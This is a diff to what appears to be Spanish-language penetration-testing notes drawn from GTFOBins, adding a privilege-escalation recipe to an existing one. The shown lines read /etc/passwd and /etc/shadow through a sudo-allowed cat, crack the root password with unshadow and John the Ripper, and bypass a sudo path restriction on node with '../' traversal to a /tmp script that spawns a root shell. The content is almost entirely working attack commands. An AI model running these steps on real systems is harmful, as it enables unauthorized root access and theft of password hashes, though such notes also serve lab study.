@@ -53,11 +53,25 @@ A continuación, se os comparte el recurso GTFOBINS el cual utilizamos en esta c
 
 	#  (root) NOPASSWD: /bin/cat  
 
-# Ejecutar el comando en la maquina vitima de la siguiente manera:
+# Ejecutar el comando en la maquina vítima de la siguiente manera:
 ❯ sudo cat /etc/passwd        # Mirar el contenido para copiarlo a Kali en un archivo llamado 'passwd'
 ❯ sudo cat /etc/shadow        # Mirar el contenido para copiarlo a Kali en un archivo llamado 'shadow'
 
 # En Kali 
 ❯ unshadow passwd shadow > pwd.txt  
 ❯ john pwd.txt -w=/usr/share/wordlists/john.lst   # Obtener la password del usuario 'root'
+```
+
+```bash 
+❯ sudo -l       # Ejecutar el comando 'node' sin password pero obligado a una ruta 
+
+	# (ALL) /usr/bin/node /usr/local/scripts/*.js   
+
+
+# Ejecutar el comando en la maquina vítima de la siguiente manera:
+❯ sudo /usr/bin/node /usr/local/scripts/../../../../tmp/esc.js   
+
+
+# Se debe crear un archivo llamado 'esc.js' en la carpeta /tmp y tendrá lo siguiente:
+	require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
 ```
